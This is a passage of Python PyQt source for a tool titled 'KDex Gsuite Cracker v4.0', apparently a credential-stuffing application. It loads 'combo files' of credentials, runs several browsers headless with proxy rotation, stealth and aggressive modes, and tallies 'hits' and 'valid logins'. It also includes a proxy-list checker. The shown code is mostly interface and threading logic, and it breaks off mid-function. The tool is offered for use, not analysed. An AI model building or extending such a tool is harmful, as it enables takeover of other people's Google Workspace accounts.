        self.log(f"🎯 What are we checking today? Proxy server connectivity and speed", 'cyan')
        self.log("="*60, 'cyan')
        
        self.workers = workers
        self.timeout = timeout
        self.test_url = test_url
        
        if not self.load_proxies(proxy_file):
            return False
        
        # Display configuration
        self.log("⚙️ Configuration Summary:", 'cyan')
        self.log(f"   👥 Workers: {workers} parallel connections", 'white')
        self.log(f"   ⏱️ Timeout: {timeout} seconds per proxy", 'white')
        self.log(f"   🌐 Test URL: {test_url}", 'white')
        
        self.running = True
        self.start_time = time.time()
        
        # Clear working proxies file
        try:
            if os.path.exists(self.working_file):
                os.remove(self.working_file)
                self.log(f"🗑️ Cleared previous working proxies file", 'yellow')
        except:
            pass
        
        self.log("🔥 Starting proxy connectivity testing...", 'green')
        self.log(f"👥 Launching {workers} worker threads for parallel testing", 'cyan')
        
        # For large files, process in chunks
        file_size = os.path.getsize(proxy_file)
        if file_size > 100 * 1024 * 1024 and not self.proxies:  # 100MB+ and not already loaded
            current_index = 0
            with ThreadPoolExecutor(max_workers=workers) as executor:
                while current_index < self.total_count and self.running:
                    # Load a chunk of proxies
                    chunk_size = min(self.chunk_size, self.total_count - current_index)
                    chunk = self.get_proxy_chunk(current_index, chunk_size)
                    
                    if not chunk:
                        self.log(f"[!] Failed to load chunk at index {current_index}", 'red')
                        break
                    
                    # Process the chunk
                    for proxy in chunk:
                        if not self.running:
                            break
                            
                        while self.paused and self.running:
                            time.sleep(0.5)
                            
                        executor.submit(self.test_proxy, proxy)
                    
                    # Move to next chunk
                    current_index += len(chunk)
                    
                    # Small delay between chunks to prevent overwhelming the system
                    time.sleep(0.1)
        else:
            # For smaller files, process normally
            with ThreadPoolExecutor(max_workers=workers) as executor:
                for proxy in self.proxies:
                    if not self.running:
                        break
                        
                    while self.paused and self.running:
                        time.sleep(0.5)
                        
                    executor.submit(self.test_proxy, proxy)
                    time.sleep(0.01)
        
        # Add detailed completion message if not manually stopped
        if self.running:
            self.log("\n" + "="*50, 'green')
            self.log(f"Proxy checking completed successfully", 'green')
            self.log(f"[] Processed: {self.checked_count}/{self.total_count} proxies", 'white')
            self.log(f"[] Working proxies: {self.working_proxies} (saved to {self.working_file})", 'white')
            self.log(f"[] Success rate: {(self.working_proxies/self.checked_count*100):.1f}% if checked > 0 else 0%", 'white')
            self.log(f"[{time.strftime('%H:%M:%S')}] Proxy checker completed successfully!", 'green')
            self.log("="*50 + "\n", 'green')
                
        return True

    def stop(self):
        self.running = False
        self.paused = False

    def pause(self):
        self.paused = True

    def resume(self):
        self.paused = False


class UniversalCheckerGUI(QMainWindow):
    log_signal = pyqtSignal(str, str, str)  # browser_type, message, color
    update_stats_signal = pyqtSignal(str)   # browser_type
    
    def __init__(self):
        super().__init__()
        self.dark_mode = False
        self.init_checkers()
        self.init_ui()
        self.setup_signals()
        self.apply_theme()
        
    def init_checkers(self):
        self.checkers = {
            'chrome': BrowserChecker('chrome', gui=self),
            'firefox': BrowserChecker('firefox', gui=self),
            'firefox-nightly': BrowserChecker('firefox-nightly', gui=self),
            'brave': BrowserChecker('brave', gui=self),
            'edge': BrowserChecker('edge', gui=self)
        }
        self.proxy_checker = ProxyChecker(gui=self)
        
    def init_ui(self):
        self.setWindowTitle(" KDex Gsuite Cracker v4.0 - Universal Edition")
        self.setGeometry(100, 100, 1400, 900)
        self.setMinimumSize(1200, 800)
        
        # Central widget
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        
        # Main layout
        main_layout = QVBoxLayout(central_widget)
        main_layout.setSpacing(10)
        main_layout.setContentsMargins(15, 15, 15, 15)
        
        # Title section
        self.create_title_section(main_layout)
        
        # Tab widget
        self.tab_widget = QTabWidget()
        self.tab_widget.setTabPosition(QTabWidget.North)
        
        # Create tabs
        self.create_browser_tabs()
        self.create_proxy_tab()
        
        main_layout.addWidget(self.tab_widget)
        
        # Status bar
        self.status_bar = self.statusBar()
        if self.status_bar:
            self.status_bar.showMessage("🚀 Ready to start checking!")
        
    def create_title_section(self, layout):
        title_widget = QWidget()
        title_widget.setFixedHeight(70)
        
        title_layout = QHBoxLayout(title_widget)
        title_layout.setContentsMargins(20, 10, 20, 10)
        
        # Icon and title
        icon_label = QLabel("")
        icon_label.setStyleSheet("font-size: 36px;")
        
        title_label = QLabel("KDex Gsuite Cracker")
        title_label.setStyleSheet("font-size: 22px; font-weight: bold; margin-left: 15px;")
        
        version_label = QLabel("v4.0 - Universal Edition")
        version_label.setStyleSheet("font-size: 12px; margin-left: 10px; margin-top: 5px;")
        
        # Dark mode toggle
        self.dark_mode_btn = QPushButton("🌙")
        self.dark_mode_btn.setFixedSize(40, 40)
        self.dark_mode_btn.clicked.connect(self.toggle_dark_mode)
        
        title_layout.addWidget(icon_label)
        title_layout.addWidget(title_label)
        title_layout.addWidget(version_label)
        title_layout.addStretch()
        title_layout.addWidget(self.dark_mode_btn)
        
        layout.addWidget(title_widget)
        
    def create_browser_tabs(self):
        browsers = {
            'chrome': ('Chrome', '#4285F4'),
            'firefox': ('🦊 Firefox', '#FF7139'),
            'firefox-nightly': ('🦊 Nightly', '#FF7139'),
            'brave': ('🦁 Brave', '#FB542B'),
            'edge': ('🌐 Edge', '#0078D7')
        }
        


        for browser_type, (tab_name, color) in browsers.items():
            tab_widget = self.create_browser_tab(browser_type)
            self.tab_widget.addTab(tab_widget, tab_name)
            
    def create_browser_tab(self, browser_type):
        tab_widget = QWidget()
        layout = QHBoxLayout(tab_widget)
        layout.setSpacing(15)
        layout.setContentsMargins(15, 15, 15, 15)
        
        # Left panel (controls)
        left_panel = QWidget()
        left_panel.setFixedWidth(450)
        left_layout = QVBoxLayout(left_panel)
        left_layout.setSpacing(10)
        
        # Control buttons
        control_group = QGroupBox("🎮 Control Panel")
        control_layout = QHBoxLayout(control_group)
        control_layout.setSpacing(8)
        
        start_btn = QPushButton("▶️ Start")
        pause_btn = QPushButton("⏸️ Pause")
        stop_btn = QPushButton("⏹️ Stop")
        clear_btn = QPushButton("🗑️ Clear")
        
        pause_btn.setEnabled(False)
        stop_btn.setEnabled(False)
        
        control_layout.addWidget(start_btn)
        control_layout.addWidget(pause_btn)
        control_layout.addWidget(stop_btn)
        control_layout.addWidget(clear_btn)
        
        # Configuration
        config_group = QGroupBox("⚙️ Configuration")
        config_group.setStyleSheet("QGroupBox { font-size: 14px; font-weight: bold; }")
        config_layout = QVBoxLayout(config_group)
        config_layout.setSpacing(12)
        config_layout.setContentsMargins(15, 20, 15, 15)
        
        # Files Section
        files_group = QGroupBox("📁 Files")
        files_layout = QVBoxLayout(files_group)
        files_layout.setSpacing(10)
        
        # Combo file
        combo_layout = QHBoxLayout()
        combo_layout.addWidget(QLabel(" Combo File:"))
        combo_edit = QLineEdit()
        browse_btn = QPushButton("📂")
        browse_btn.setFixedWidth(40)
        combo_layout.addWidget(combo_edit)
        combo_layout.addWidget(browse_btn)
        files_layout.addLayout(combo_layout)
        
        # Browser path
        browser_path_layout = QHBoxLayout()
        browser_path_layout.addWidget(QLabel("🌐 Browser Path:"))
        browser_path_edit = QLineEdit()
        browser_path_edit.setText(BROWSER_PATHS[browser_type].get(sys.platform, ""))
        browser_path_edit.setPlaceholderText("Custom browser path (optional)")
        browse_browser_btn = QPushButton("📂")
        browse_browser_btn.setFixedWidth(40)
        browser_path_layout.addWidget(browser_path_edit)
        browser_path_layout.addWidget(browse_browser_btn)
        files_layout.addLayout(browser_path_layout)
        
        config_layout.addWidget(files_group)
        
        # Settings row
        settings_layout = QHBoxLayout()
        
        # Workers
        settings_layout.addWidget(QLabel("👥 Workers:"))
        workers_spin = QSpinBox()
        workers_spin.setRange(1, MAX_WORKERS_SAFE)
        workers_spin.setValue(DEFAULT_WORKERS)
        workers_spin.setFixedWidth(60)
        settings_layout.addWidget(workers_spin)
        
        # Mode
        settings_layout.addWidget(QLabel("🎯 Mode:"))
        mode_combo = QComboBox()
        mode_combo.addItems(["Safe", "Aggressive"])
        mode_combo.setFixedWidth(80)
        settings_layout.addWidget(mode_combo)
        
        settings_layout.addStretch()
        config_layout.addLayout(settings_layout)
        
        # Checkboxes
        headless_check = QCheckBox("🔍 Headless Mode")
        headless_check.setChecked(True)
        proxy_check = QCheckBox("🌐 Use Proxies")
        stealth_check = QCheckBox("🛡️ Stealth Mode")
        resume_check = QCheckBox("⏮️ Resume")
        
        config_layout.addWidget(headless_check)
        config_layout.addWidget(proxy_check)
        config_layout.addWidget(stealth_check)
        config_layout.addWidget(resume_check)

        recheck_layout = QHBoxLayout()
        recheck_check = QCheckBox("🔁 Recheck Failed")
        recheck_layout.addWidget(recheck_check)
        recheck_label = QLabel("(for slow network errors)")
        recheck_label.setStyleSheet("font-size: 9px; color: gray;")
        recheck_layout.addWidget(recheck_label)
        recheck_layout.addStretch()
        config_layout.addLayout(recheck_layout)
        
        # Memory controls
        memory_layout = QHBoxLayout()
        clear_memory_btn = QPushButton("🧹 Clear Memory")
        clear_memory_btn.setFixedWidth(120)
        memory_layout.addWidget(clear_memory_btn)
        memory_layout.addStretch()
        config_layout.addLayout(memory_layout)
        
        # Progress
        progress_group = QGroupBox("📊 Progress")
        progress_layout = QVBoxLayout(progress_group)
        progress_layout.setSpacing(8)
        
        progress_bar = QProgressBar()
        progress_bar.setRange(0, 100)
        progress_bar.setValue(0)
        progress_layout.addWidget(progress_bar)
        
        # Stats
        stats_layout = QGridLayout()
        stats_layout.setSpacing(5)
        
        stats = [
            ("📧", "Checked:", "0"),
            ("🎯", "Hits:", "0"),
            ("📊", "Total:", "0"),
            ("⚡", "Speed:", "0/min"),
            ("⏳", "Remaining:", "0"),
            ("📈", "Hit Rate:", "0%")
        ]
        
        stat_labels = {}
        for i, (icon, label, value) in enumerate(stats):
            row, col = i // 2, (i % 2) * 3
            
            stats_layout.addWidget(QLabel(icon), row, col)
            stats_layout.addWidget(QLabel(label), row, col + 1)
            value_label = QLabel(value)
            value_label.setStyleSheet("font-weight: bold;")
            stats_layout.addWidget(value_label, row, col + 2)
            
            stat_labels[label.rstrip(':')] = value_label
        
        progress_layout.addLayout(stats_layout)
        
        left_layout.addWidget(control_group)
        left_layout.addWidget(config_group)
        left_layout.addWidget(progress_group)
        left_layout.addStretch()
        
        # Right panel (console)
        right_panel = QWidget()
        right_layout = QVBoxLayout(right_panel)
        
        console_group = QGroupBox("💻 Console Output")
        console_group.setStyleSheet("QGroupBox { font-size: 14px; font-weight: bold; }")
        console_layout = QVBoxLayout(console_group)
        console_layout.setSpacing(10)
        console_layout.setContentsMargins(15, 20, 15, 15)
        
        # Console toolbar
        toolbar_layout = QHBoxLayout()
        auto_scroll_check = QCheckBox("📜 Auto-scroll")
        auto_scroll_check.setChecked(True)
        clear_console_btn = QPushButton("🧹 Clear Console")
        toolbar_layout.addWidget(auto_scroll_check)
        toolbar_layout.addStretch()
        toolbar_layout.addWidget(clear_console_btn)
        console_layout.addLayout(toolbar_layout)
        
        console = QTextEdit()
        console.setReadOnly(True)
        console.setFont(QFont("Consolas", 10))
        console.setStyleSheet("QTextEdit { padding: 10px; }")
        console.append("🎉 Welcome to KDex Gsuite Cracker! Ready to start checking credentials!")
        console_layout.addWidget(console)
        
        right_layout.addWidget(console_group)
        
        layout.addWidget(left_panel)
        layout.addWidget(right_panel)
        
        # Store references
        setattr(self, f'{browser_type}_start_btn', start_btn)
        setattr(self, f'{browser_type}_pause_btn', pause_btn)
        setattr(self, f'{browser_type}_stop_btn', stop_btn)
        setattr(self, f'{browser_type}_clear_btn', clear_btn)
        setattr(self, f'{browser_type}_combo_edit', combo_edit)
        setattr(self, f'{browser_type}_browse_btn', browse_btn)
        setattr(self, f'{browser_type}_browse_browser_btn', browse_browser_btn)
        setattr(self, f'{browser_type}_browser_path_edit', browser_path_edit)
        setattr(self, f'{browser_type}_workers_spin', workers_spin)
        setattr(self, f'{browser_type}_mode_combo', mode_combo)
        setattr(self, f'{browser_type}_headless_check', headless_check)
        setattr(self, f'{browser_type}_proxy_check', proxy_check)
        setattr(self, f'{browser_type}_stealth_check', stealth_check)
        setattr(self, f'{browser_type}_resume_check', resume_check)
        setattr(self, f'{browser_type}_recheck_check', recheck_check)
        setattr(self, f'{browser_type}_clear_memory_btn', clear_memory_btn)
        setattr(self, f'{browser_type}_progress_bar', progress_bar)
        setattr(self, f'{browser_type}_stat_labels', stat_labels)
        setattr(self, f'{browser_type}_console', console)
        
        return tab_widget
        
    def create_proxy_tab(self):
        tab_widget = QWidget()
        layout = QHBoxLayout(tab_widget)
        layout.setSpacing(15)
        layout.setContentsMargins(15, 15, 15, 15)
        
        # Left panel
        left_panel = QWidget()
        left_panel.setFixedWidth(380)
        left_layout = QVBoxLayout(left_panel)
        left_layout.setSpacing(10)
        
        # Control buttons
        control_group = QGroupBox("🎮 Proxy Control")
        control_layout = QHBoxLayout(control_group)
        control_layout.setSpacing(8)
        
        self.proxy_start_btn = QPushButton("▶️ Start")
        self.proxy_pause_btn = QPushButton("⏸️ Pause")
        self.proxy_stop_btn = QPushButton("⏹️ Stop")
        self.proxy_clear_btn = QPushButton("🗑️ Clear")
        
        self.proxy_pause_btn.setEnabled(False)
        self.proxy_stop_btn.setEnabled(False)
        
        control_layout.addWidget(self.proxy_start_btn)
        control_layout.addWidget(self.proxy_pause_btn)
        control_layout.addWidget(self.proxy_stop_btn)
        control_layout.addWidget(self.proxy_clear_btn)
        
        # Configuration
        config_group = QGroupBox("⚙️ Configuration")
        config_layout = QVBoxLayout(config_group)
        config_layout.setSpacing(8)
        
        # Proxy file
        proxy_layout = QHBoxLayout()
        proxy_layout.addWidget(QLabel("📁 Proxy File:"))
        self.proxy_file_edit = QLineEdit()
        self.proxy_browse_btn = QPushButton("📂")
        self.proxy_browse_btn.setFixedWidth(40)
        proxy_layout.addWidget(self.proxy_file_edit)
        proxy_layout.addWidget(self.proxy_browse_btn)
        config_layout.addLayout(proxy_layout)
        
        # Settings
        settings_layout = QHBoxLayout()
        
        settings_layout.addWidget(QLabel("👥 Workers:"))
        self.proxy_workers_spin = QSpinBox()
        self.proxy_workers_spin.setRange(1, 50)
        self.proxy_workers_spin.setValue(DEFAULT_WORKERS)
        self.proxy_workers_spin.setFixedWidth(60)
        settings_layout.addWidget(self.proxy_workers_spin)
        
        settings_layout.addWidget(QLabel("⏱️ Timeout:"))
        self.proxy_timeout_spin = QSpinBox()
        self.proxy_timeout_spin.setRange(5, 60)
        self.proxy_timeout_spin.setValue(10)
        self.proxy_timeout_spin.setFixedWidth(60)
        settings_layout.addWidget(self.proxy_timeout_spin)
        
        settings_layout.addStretch()
        config_layout.addLayout(settings_layout)
        
        # Test URL
        url_layout = QHBoxLayout()
        url_layout.addWidget(QLabel("🌐 Test URL:"))
        self.proxy_test_url_edit = QLineEdit("http://httpbin.org/ip")
        url_layout.addWidget(self.proxy_test_url_edit)
        config_layout.addLayout(url_layout)
        
        # Progress
        progress_group = QGroupBox("📊 Progress")
        progress_layout = QVBoxLayout(progress_group)
        progress_layout.setSpacing(8)
        
        self.proxy_progress_bar = QProgressBar()
        self.proxy_progress_bar.setRange(0, 100)
        self.proxy_progress_bar.setValue(0)
        progress_layout.addWidget(self.proxy_progress_bar)
        
        # Stats
        stats_layout = QGridLayout()
        stats_layout.setSpacing(5)
        
        stats = [
            ("📧", "Checked:", "0"),
            ("✅", "Working:", "0"),
            ("📊", "Total:", "0"),
            ("⚡", "Speed:", "0/min")
        ]
        
        self.proxy_stat_labels = {}
        for i, (icon, label, value) in enumerate(stats):
            row, col = i // 2, (i % 2) * 3
            
            stats_layout.addWidget(QLabel(icon), row, col)
            stats_layout.addWidget(QLabel(label), row, col + 1)
            value_label = QLabel(value)
            value_label.setStyleSheet("font-weight: bold;")
            stats_layout.addWidget(value_label, row, col + 2)
            
            self.proxy_stat_labels[label.rstrip(':')] = value_label
        
        progress_layout.addLayout(stats_layout)
        
        left_layout.addWidget(control_group)
        left_layout.addWidget(config_group)
        left_layout.addWidget(progress_group)
        left_layout.addStretch()
        
        # Right panel (console)
        right_panel = QWidget()
        right_layout = QVBoxLayout(right_panel)
        
        console_group = QGroupBox("💻 Console Output")
        console_layout = QVBoxLayout(console_group)
        
        self.proxy_console = QTextEdit()
        self.proxy_console.setReadOnly(True)
        self.proxy_console.setFont(QFont("Consolas", 10))
        console_layout.addWidget(self.proxy_console)
        
        right_layout.addWidget(console_group)
        
        layout.addWidget(left_panel)
        layout.addWidget(right_panel)
        
        self.tab_widget.addTab(tab_widget, "🔍 Proxy Checker")
        
    def setup_signals(self):
        self.log_signal.connect(self.add_log)
        self.update_stats_signal.connect(self.update_stats)
        
        # Browser signals
        for browser_type in self.checkers.keys():
            start_btn = getattr(self, f'{browser_type}_start_btn')
            pause_btn = getattr(self, f'{browser_type}_pause_btn')
            stop_btn = getattr(self, f'{browser_type}_stop_btn')
            clear_btn = getattr(self, f'{browser_type}_clear_btn')
            browse_btn = getattr(self, f'{browser_type}_browse_btn')
            clear_memory_btn = getattr(self, f'{browser_type}_clear_memory_btn')
            
            start_btn.clicked.connect(lambda checked, bt=browser_type: self.start_checking(bt))
            pause_btn.clicked.connect(lambda checked, bt=browser_type: self.pause_checking(bt))
            stop_btn.clicked.connect(lambda checked, bt=browser_type: self.stop_checking(bt))
            clear_btn.clicked.connect(lambda checked, bt=browser_type: self.clear_console(bt))
            browse_btn.clicked.connect(lambda checked, bt=browser_type: self.browse_combo(bt))
            browse_browser_btn = getattr(self, f'{browser_type}_browse_browser_btn')
            browse_browser_btn.clicked.connect(lambda checked, bt=browser_type: self.browse_browser_path(bt))
            clear_memory_btn.clicked.connect(lambda checked, bt=browser_type: self.clear_memory(bt))
        
        self.proxy_start_btn.clicked.connect(self.start_proxy_checking)
        self.proxy_pause_btn.clicked.connect(self.pause_proxy_checking)
        self.proxy_stop_btn.clicked.connect(self.stop_proxy_checking)
        self.proxy_clear_btn.clicked.connect(lambda: self.clear_console('proxy'))
        self.proxy_browse_btn.clicked.connect(self.browse_proxy_file)


        
    def apply_theme(self):
        if self.dark_mode:
            # Dark theme with reduced contrast
            self.setStyleSheet("""
                QMainWindow { background-color: #2b2b2b; color: #d0d0d0; }
                QWidget { background-color: #2b2b2b; color: #d0d0d0; }
                QGroupBox { 
                    font-weight: bold; 
                    border: 1px solid #555555; 
                    border-radius: 5px; 
                    margin-top: 10px; 
                    padding-top: 10px;
                    background-color: #323232;
                }
                QGroupBox::title { 
                    subcontrol-origin: margin; 
                    left: 10px; 
                    padding: 0 5px 0 5px; 
                    background-color: #323232;
                }
                QPushButton { 
                    background-color: #404040; 
                    border: 1px solid #606060; 
                    border-radius: 4px; 
                    padding: 6px 12px; 
                    font-weight: bold;
                }
                QPushButton:hover { background-color: #505050; }
                QPushButton:pressed { background-color: #353535; }
                QPushButton:disabled { background-color: #2a2a2a; color: #666666; }
                QLineEdit, QSpinBox, QComboBox { 
                    background-color: #404040; 
                    border: 1px solid #606060; 
                    border-radius: 3px; 
                    padding: 4px; 
                }
                QTextEdit { 
                    background-color: #1e1e1e; 
                    border: 1px solid #606060; 
                    border-radius: 3px; 
                }
                QProgressBar { 
                    border: 1px solid #606060; 
                    border-radius: 3px; 
                    text-align: center; 
                    background-color: #404040;
                }
                QProgressBar::chunk { 
                    background-color: #4CAF50; 
                    border-radius: 2px; 
                }
                QTabWidget::pane { 
                    border: 1px solid #606060; 
                    background-color: #323232;
                }
                QTabBar::tab { 
                    background-color: #404040; 
                    border: 1px solid #606060; 
                    padding: 8px 16px; 
                    margin-right: 2px;
                }
                QTabBar::tab:selected { 
                    background-color: #4CAF50; 
                    color: white;
                }
                QCheckBox::indicator { 
                    width: 16px; 
                    height: 16px; 
                    border: 1px solid #606060; 
                    border-radius: 3px; 
                    background-color: #404040;
                }
                QCheckBox::indicator:checked { 
                    background-color: #4CAF50; 
                }
                QStatusBar { 
                    background-color: #404040; 
                    border-top: 1px solid #606060; 
                }
            """)
            self.dark_mode_btn.setText("☀️")
        else:
            # Light theme with reduced contrast
            self.setStyleSheet("""
                QMainWindow { background-color: #f8f8f8; color: #333333; }
                QWidget { background-color: #f8f8f8; color: #333333; }
                QGroupBox { 
                    font-weight: bold; 
                    border: 1px solid #cccccc; 
                    border-radius: 5px; 
                    margin-top: 10px; 
                    padding-top: 10px;
                    background-color: #ffffff;
                }
                QGroupBox::title { 
                    subcontrol-origin: margin; 
                    left: 10px; 
                    padding: 0 5px 0 5px; 
                    background-color: #ffffff;
                }
                QPushButton { 
                    background-color: #e8e8e8; 
                    border: 1px solid #cccccc; 
                    border-radius: 4px; 
                    padding: 6px 12px; 
                    font-weight: bold;
                }
                QPushButton:hover { background-color: #d8d8d8; }
                QPushButton:pressed { background-color: #c8c8c8; }
                QPushButton:disabled { background-color: #f0f0f0; color: #999999; }
                QLineEdit, QSpinBox, QComboBox { 
                    background-color: #ffffff; 
                    border: 1px solid #cccccc; 
                    border-radius: 3px; 
                    padding: 4px; 
                }
                QTextEdit { 
                    background-color: #1e1e1e; 
                    color: #e0e0e0;
                    border: 1px solid #cccccc; 
                    border-radius: 3px; 
                }
                QProgressBar { 
                    border: 1px solid #cccccc; 
                    border-radius: 3px; 
                    text-align: center; 
                    background-color: #f0f0f0;
                }
                QProgressBar::chunk { 
                    background-color: #4CAF50; 
                    border-radius: 2px; 
                }
                QTabWidget::pane { 
                    border: 1px solid #cccccc; 
                    background-color: #ffffff;
                }
                QTabBar::tab { 
                    background-color: #e8e8e8; 
                    border: 1px solid #cccccc; 
                    padding: 8px 16px; 
                    margin-right: 2px;
                }
                QTabBar::tab:selected { 
                    background-color: #4CAF50; 
                    color: white;
                }
                QCheckBox::indicator { 
                    width: 16px; 
                    height: 16px; 
                    border: 1px solid #cccccc; 
                    border-radius: 3px; 
                    background-color: #ffffff;
                }
                QCheckBox::indicator:checked { 
                    background-color: #4CAF50; 
                }
                QStatusBar { 
                    background-color: #e8e8e8; 
                    border-top: 1px solid #cccccc; 
                }
            """)
            self.dark_mode_btn.setText("🌙")
    
    def toggle_dark_mode(self):
        self.dark_mode = not self.dark_mode
        self.apply_theme()
        
    def add_log(self, browser_type, message, color):
        timestamp = time.strftime("[%H:%M:%S] ")
        
        color_map = {
            'green': '#4CAF50',
            'red': '#F44336',
            'orange': '#FF9800',
            'yellow': '#FFEB3B',
            'cyan': '#00BCD4',
            'gray': '#9E9E9E',
            'white': '#E0E0E0'
        }
        
        html_color = color_map.get(color, '#E0E0E0')
        formatted_message = f'<span style="color: {html_color}; font-weight: bold;">{timestamp}{message}</span><br>'
        
        if browser_type == 'proxy':
            console = self.proxy_console
        else:
            console = getattr(self, f'{browser_type}_console')
        
        cursor = console.textCursor()
        cursor.movePosition(QTextCursor.End)
        cursor.insertHtml(formatted_message)
        console.setTextCursor(cursor)
        console.ensureCursorVisible()
        
    def update_stats(self, browser_type):
        if browser_type == 'proxy':
            checker = self.proxy_checker
            if checker.total_count > 0:
                progress = int((checker.checked_count / checker.total_count) * 100)
                self.proxy_progress_bar.setValue(progress)
                
                self.proxy_stat_labels['Checked'].setText(str(checker.checked_count))
                self.proxy_stat_labels['Working'].setText(str(checker.working_proxies))
                self.proxy_stat_labels['Total'].setText(str(checker.total_count))
                
                elapsed = time.time() - checker.start_time
                if elapsed > 0:
                    speed = (checker.checked_count / elapsed) * 60
                    self.proxy_stat_labels['Speed'].setText(f"{speed:.1f}/min")
        else:
            checker = self.checkers[browser_type]
            stat_labels = getattr(self, f'{browser_type}_stat_labels')
            progress_bar = getattr(self, f'{browser_type}_progress_bar')
            
            if checker.total_count > 0:
                progress = int((checker.checked_count / checker.total_count) * 100)
                progress_bar.setValue(progress)
                
                stat_labels['Checked'].setText(str(checker.checked_count))
                stat_labels['Hits'].setText(str(checker.hits))
                stat_labels['Total'].setText(str(checker.total_count))
                
                remaining = checker.total_count - checker.checked_count
                stat_labels['Remaining'].setText(str(remaining))
                
                elapsed = time.time() - checker.start_time
                if elapsed > 0:
                    speed = (checker.checked_count / elapsed) * 60
                    stat_labels['Speed'].setText(f"{speed:.1f}/min")
                
                if checker.checked_count > 0:
                    hit_rate = (checker.hits / checker.checked_count) * 100
                    stat_labels['Hit Rate'].setText(f"{hit_rate:.1f}%")
    
    def browse_combo(self, browser_type):
        file_path, _ = QFileDialog.getOpenFileName(
            self, "Select Combo File", "", "Text files (*.txt);;All files (*.*)"
        )
        if file_path:
            combo_edit = getattr(self, f'{browser_type}_combo_edit')
            combo_edit.setText(file_path)
            checker = self.checkers[browser_type]
            checker.load_combos(file_path, resume=False)

    def browse_browser_path(self, browser_type):
        file_path, _ = QFileDialog.getOpenFileName(
            self, "Select Browser Executable", "", "Executable files (*.exe);;All files (*.*)"
        )
        if file_path:
            browser_path_edit = getattr(self, f'{browser_type}_browser_path_edit')
            browser_path_edit.setText(file_path)
            
    def browse_proxy_file(self):
        file_path, _ = QFileDialog.getOpenFileName(
            self, "Select Proxy File", "", "Text files (*.txt);;All files (*.*)"
        )
        if file_path:
            self.proxy_file_edit.setText(file_path)


            
    def clear_console(self, console_type):
        if console_type == 'proxy':
            self.proxy_console.clear()
        else:
            console = getattr(self, f'{console_type}_console')
            console.clear()
            
    def clear_memory(self, browser_type):
        reply = QMessageBox.question(
            self, "Clear Memory", 
            f"Are you sure you want to clear {browser_type} memory?",
            QMessageBox.Yes | QMessageBox.No
        )
        if reply == QMessageBox.Yes:
            self.checkers[browser_type].clear_memory()
            QMessageBox.information(self, "Success", f"{browser_type.title()} memory cleared!")
            
    def start_checking(self, browser_type):
        combo_edit = getattr(self, f'{browser_type}_combo_edit')
        combo_file = combo_edit.text().strip()
        
        if not combo_file:
            QMessageBox.warning(self, "Error", "Please select a combo file!")
            return
            
        if not os.path.exists(combo_file):
            QMessageBox.warning(self, "Error", f"Combo file not found: {combo_file}")
            return
        
        checker = self.checkers[browser_type]
        # Reset checker state for clean restart
        checker.running = False
        checker.paused = False
        
        browser_path_edit = getattr(self, f'{browser_type}_browser_path_edit')
        checker.browser_path_override = browser_path_edit.text().strip()

        # Get settings
        workers_spin = getattr(self, f'{browser_type}_workers_spin')
        mode_combo = getattr(self, f'{browser_type}_mode_combo')
        headless_check = getattr(self, f'{browser_type}_headless_check')
        proxy_check = getattr(self, f'{browser_type}_proxy_check')
        stealth_check = getattr(self, f'{browser_type}_stealth_check')
        resume_check = getattr(self, f'{browser_type}_resume_check')
        recheck_check = getattr(self, f'{browser_type}_recheck_check')
        
        # Update UI
        start_btn = getattr(self, f'{browser_type}_start_btn')
        pause_btn = getattr(self, f'{browser_type}_pause_btn')
        stop_btn = getattr(self, f'{browser_type}_stop_btn')
        
        start_btn.setEnabled(False)
        pause_btn.setEnabled(True)
        stop_btn.setEnabled(True)
        
        # Start checker
        threading.Thread(
            target=self.run_checker,
            args=(
                browser_type,
                combo_file,
                workers_spin.value(),
                proxy_check.isChecked(),
                mode_combo.currentText() == "Aggressive",
                headless_check.isChecked(),
                stealth_check.isChecked(),
                resume_check.isChecked(),
                recheck_check.isChecked()
            ),
            daemon=True
        ).start()
        
    def run_checker(self, browser_type, combo_file, workers, use_proxies, aggressive_mode, headless_mode, stealth_mode, resume, recheck_fails):
        try:
            checker = self.checkers[browser_type]
            success = checker.start(combo_file, workers, use_proxies, aggressive_mode, headless_mode, stealth_mode, resume, recheck_fails)
            QTimer.singleShot(0, lambda: self.on_checker_complete(browser_type))
        except Exception as e:
            self.log_signal.emit(browser_type, f"Error: {str(e)}", 'red')
            QTimer.singleShot(0, lambda: self.on_checker_complete(browser_type))
            
    def pause_checking(self, browser_type):
        checker = self.checkers[browser_type]
        pause_btn = getattr(self, f'{browser_type}_pause_btn')
        
        if checker.paused:
            checker.resume()
            pause_btn.setText("⏸️ Pause")
            self.log_signal.emit(browser_type, CONSOLE_MESSAGES['resumed'], 'green')
        else:
            self.log_signal.emit(browser_type, CONSOLE_MESSAGES['pausing'], 'yellow')
            checker.pause()
            pause_btn.setText("▶️ Resume")
            self.log_signal.emit(browser_type, CONSOLE_MESSAGES['paused'], 'yellow')
            
    def stop_checking(self, browser_type):
        checker = self.checkers[browser_type]
        self.log_signal.emit(browser_type, "[⏹] Stop requested - finishing current workers...", 'yellow')
        checker.stop()
        
        # Ensure UI is properly reset after a short delay
        QTimer.singleShot(1000, lambda: self.on_checker_complete(browser_type))
        
    def on_checker_complete(self, browser_type):
        start_btn = getattr(self, f'{browser_type}_start_btn')
        pause_btn = getattr(self, f'{browser_type}_pause_btn')
        stop_btn = getattr(self, f'{browser_type}_stop_btn')
        
        start_btn.setEnabled(True)
        pause_btn.setEnabled(False)
        stop_btn.setEnabled(False)
        pause_btn.setText("⏸️ Pause")
        
        # Show completion message
        checker = self.checkers[browser_type]
        if checker.hits > 0:
            self.log_signal.emit(browser_type, f"🎉 Session complete! Found {checker.hits} valid logins!", 'green')
        else:
            self.log_signal.emit(browser_type, "✅ Session complete! No valid logins found.", 'cyan')
        
    def start_proxy_checking(self):
        proxy_file = self.proxy_file_edit.text().strip()
        
        if not proxy_file:
            QMessageBox.warning(self, "Error", "Please select a proxy file!")
            return
            
        if not os.path.exists(proxy_file):
            QMessageBox.warning(self, "Error", f"Proxy file not found: {proxy_file}")
            return
        
        # Update UI
        self.proxy_start_btn.setEnabled(False)
        self.proxy_pause_btn.setEnabled(True)
        self.proxy_stop_btn.setEnabled(True)
        
        # Start checker
        threading.Thread(
            target=self.run_proxy_checker,
            args=(
                proxy_file,
                self.proxy_workers_spin.value(),
                self.proxy_timeout_spin.value(),
                self.proxy_test_url_edit.text()
            ),
            daemon=True
        ).start()
        
    def run_proxy_checker(self, proxy_file, workers, timeout, test_url):
        try:
            success = self.proxy_checker.start(proxy_file, workers, timeout, test_url)
            QTimer.singleShot(0, self.on_proxy_checker_complete)
        except Exception as e:
